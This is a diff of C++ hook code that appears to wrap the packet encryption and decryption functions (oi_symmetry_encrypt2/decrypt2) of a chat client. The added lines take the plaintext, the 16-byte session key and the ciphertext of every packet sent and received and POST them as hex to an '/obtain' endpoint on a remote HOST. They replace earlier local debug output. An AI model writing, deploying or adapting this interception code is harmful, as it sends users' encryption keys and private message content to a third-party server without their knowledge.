@@ -1,3 +1,4 @@
+#include "httplib.h"
 #include <windows.h>
 #include <iostream>
 #include "Common.h"
@@ -6,25 +7,47 @@
 
 
 using namespace std;
+using namespace httplib;
+
+Client cli(HOST);
 
 void __cdecl my_oi_symmetry_encrypt2(const BYTE *pInBuf, int nInBufLen, const BYTE *pKey, BYTE *pOutBuf, int *pOutBufLen){
     oi_symmetry_encrypt2(pInBuf, nInBufLen, pKey, pOutBuf, pOutBufLen);
-    OutputDebugString("my_oi_symmetry_encrypt2");
+
+    stringstream ss;
+    ss << "==================客户端发包==================" << endl;
+    ss << "明文数据" << binaryToHex(pInBuf, nInBufLen) << endl;
+    ss << "KEY" << binaryToHex(pKey, 16) << endl;
+    ss << "密文数据" << binaryToHex(pOutBuf, *pOutBufLen) << endl;
+    ss << "==================客户端发包==================" << endl;
+    cli.Post("/obtain", ss.str(), "text/plain");
+
+    //OutputDebugString("my_oi_symmetry_encrypt2");
     //明文数据
     //OutputDebugString(binaryToHex(pInBuf, nInBufLen).c_str());
     //KEY
     //OutputDebugString(binaryToHex(pKey, 16).c_str());
     //密文数据
-    OutputDebugString(binaryToHex(pOutBuf, *pOutBufLen).c_str());
-    uint32_t encode_buf_len,decode_buf_len;
-    unsigned char * encode_buf = tea_encode(pKey, pInBuf, nInBufLen, &encode_buf_len);
+    //OutputDebugString(binaryToHex(pOutBuf, *pOutBufLen).c_str());
+    //tea test
+    //uint32_t encode_buf_len,decode_buf_len;
+    //unsigned char * encode_buf = tea_encode(pKey, pInBuf, nInBufLen, &encode_buf_len);
     //unsigned char * decode_buf = tea_decode(pKey,encode_buf,encode_buf_len,&decode_buf_len);
-    OutputDebugString(binaryToHex(encode_buf, encode_buf_len).c_str());
+    //OutputDebugString(binaryToHex(encode_buf, encode_buf_len).c_str());
     //OutputDebugString(binaryToHex(decode_buf, decode_buf_len).c_str());
 }
 
 void __cdecl my_oi_symmetry_decrypt2(const BYTE *pInBuf, int nInBufLen, const BYTE *pKey, BYTE *pOutBuf, int *pOutBufLen){
     oi_symmetry_decrypt2(pInBuf, nInBufLen, pKey, pOutBuf, pOutBufLen);
+
+    stringstream ss;
+    ss << "==================客户端收包==================" << endl;
+    ss << "密文数据" << binaryToHex(pInBuf, nInBufLen) << endl;
+    ss << "KEY" << binaryToHex(pKey, 16) << endl;
+    ss << "明文数据" << binaryToHex(pOutBuf, *pOutBufLen) << endl;
+    ss << "==================客户端发包==================" << endl;
+    cli.Post("/obtain", ss.str(), "text/plain");
+
 //    OutputDebugString("my_oi_symmetry_decrypt2");
 //    //密文数据
 //    OutputDebugString(binaryToHex(pInBuf, nInBufLen).c_str());
